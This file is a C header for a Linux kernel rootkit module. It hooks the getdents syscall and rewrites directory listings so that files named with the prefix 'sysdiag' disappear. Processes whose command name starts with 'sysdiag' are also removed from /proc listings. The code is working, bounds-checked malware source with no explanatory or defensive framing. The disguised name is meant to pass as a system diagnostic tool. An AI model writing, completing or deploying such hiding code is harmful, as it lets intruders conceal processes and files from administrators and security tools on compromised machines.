#ifndef GETDENTS_H_
#define GETDENTS_H_

#include <linux/dirent.h>
#include <linux/pid.h>
#include <linux/stddef.h>

/* 3.10 headers do not export struct linux_dirent (private to fs/readdir.c) */
struct linux_dirent {
    unsigned long  d_ino;
    unsigned long  d_off;
    unsigned short d_reclen;
    char           d_name[];
};

#define PREFIX "sysdiag"
#define MARKER "sysdiag"

static asmlinkage long (*og_getdents)(unsigned int fd,
        struct linux_dirent __user *dirent, unsigned int count);

static bool is_numeric(const char *s)
{
    int i;
    if (!s[0])
        return false;
    for (i = 0; s[i]; i++)
        if (s[i] < '0' || s[i] > '9')
            return false;
    return true;
}

static long filter_dirents(void __user *udirent, long ret, bool is64)
{
    char *kbuf, *cur, *prev = NULL;
    unsigned long off = 0;

    kbuf = kzalloc(ret, GFP_KERNEL);
    if (!kbuf)
        return ret;

    if (copy_from_user(kbuf, udirent, ret)) {
        kfree(kbuf);
        return ret;
    }

    while (off < ret) {
        struct linux_dirent64 *d64;
        struct linux_dirent   *d32;
        char *name;
        unsigned short reclen;
        unsigned long remaining = (unsigned long)(ret - off);
        size_t hdr;                    /* bytes before d_name */
        bool hide = false;

        cur = kbuf + off;

        /* --- header validation BEFORE reading any record field --- */
        if (is64) {
            hdr = offsetof(struct linux_dirent64, d_name);   /* 19 */
            if (remaining < hdr + 1) {
                kfree(kbuf);
                return -EINVAL;
            }
            d64    = (struct linux_dirent64 *)cur;
            reclen = d64->d_reclen;
        } else {
            hdr = offsetof(struct linux_dirent, d_name);     /* 18 */
            if (remaining < hdr + 1) {
                kfree(kbuf);
                return -EINVAL;
            }
            d32    = (struct linux_dirent *)cur;
            reclen = d32->d_reclen;
        }

        /* --- record bounds validation --- */
        if (reclen < hdr + 1 || reclen > remaining) {
            kfree(kbuf);
            return -EINVAL;
        }

        /* --- bounded NUL check inside the record --- */
        name = cur + hdr;
        if (!memchr(name, '\0', reclen - hdr)) {
            kfree(kbuf);
            return -EINVAL;
        }

        /* --- hide decision --- */
        if (strncmp(name, PREFIX, strlen(PREFIX)) == 0) {
            hide = true;
        } else if (is_numeric(name)) {
            int pid;
            if (kstrtoint(name, 10, &pid) == 0) {
                struct pid *p = find_get_pid(pid);
                if (p) {
                    struct task_struct *t = get_pid_task(p, PIDTYPE_PID);
                    if (t) {
                        if (strncmp(t->comm, MARKER, strlen(MARKER)) == 0)
                            hide = true;
                        put_task_struct(t);
                    }
                    put_pid(p);
                }
            }
        }

        /* --- hide / slide / extend (with 16-bit overflow guard) --- */
        if (hide) {
            if (cur == kbuf) {
                ret -= reclen;
                memmove(cur, cur + reclen, ret);
                continue;
            }
            if (is64) {
                if ((unsigned long)((struct linux_dirent64 *)prev)->d_reclen +
                    reclen > 0xFFFF) {
                    kfree(kbuf);
                    return -EINVAL;
                }
                ((struct linux_dirent64 *)prev)->d_reclen += reclen;
            } else {
                if ((unsigned long)((struct linux_dirent *)prev)->d_reclen +
                    reclen > 0xFFFF) {
                    kfree(kbuf);
                    return -EINVAL;
                }
                ((struct linux_dirent *)prev)->d_reclen += reclen;
            }
        } else {
            prev = cur;
        }

        off += reclen;
    }

    if (copy_to_user(udirent, kbuf, ret))
        ret = -EFAULT;
    kfree(kbuf);
    return ret;
}

static asmlinkage long hooked_getdents(unsigned int fd,
        struct linux_dirent __user *dirent, unsigned int count)
{
    long ret = og_getdents(fd, dirent, count);
    if (ret <= 0)
        return ret;
    return filter_dirents(dirent, ret, false);
}

#endif